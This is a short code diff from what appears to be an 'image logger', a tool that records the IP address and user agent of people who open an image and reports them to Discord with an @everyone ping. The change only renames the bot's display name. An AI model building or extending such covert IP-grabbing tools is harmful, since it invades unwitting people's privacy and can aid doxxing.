@@ -22,7 +22,7 @@ def send_to_discord(ip, useragent, endpoint):
         
         # Create embed
         embed = {
-            "username": "IP Logger",
+            "username": "IP™ Logger",
             "content": "@everyone",
             "embeds": [{
                 "title": "Image Logger - IP Logged",
